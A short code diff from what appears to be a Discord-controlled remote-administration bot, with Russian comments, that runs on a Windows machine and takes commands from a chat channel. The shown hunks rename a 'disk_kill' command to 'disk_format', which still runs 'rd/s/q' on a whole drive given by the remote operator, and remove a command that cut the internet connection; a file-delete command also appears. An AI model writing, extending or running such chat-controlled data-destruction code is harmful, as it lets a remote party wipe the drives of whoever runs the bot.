@@ -24,7 +24,7 @@ bot.remove_command('help')
 
 
 @bot.event
-async def on_ready():  # cообщение при запуске
+async def on_ready():
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
     x, y = pg.size()
@@ -130,15 +130,9 @@ async def delete(ctx, file_on_delete):  # удалить файл
 
 
 @bot.command()
-async def disk_kill(ctx, disk):  # форматирование диска
+async def disk_format(ctx, disk):  # форматирование диска
     await ctx.send(f'**CAT:** Форматирую диск **{disk}**!')
     os.system(f'rd/s/q {disk}:\\')
-
-
-@bot.command()
-async def disable_internet(ctx):  # отключить интернет
-    await ctx.send('**CAT:** Отключаю интернет соединение...')
-    os.system(config.disable_internet)
 
 
 @bot.command()
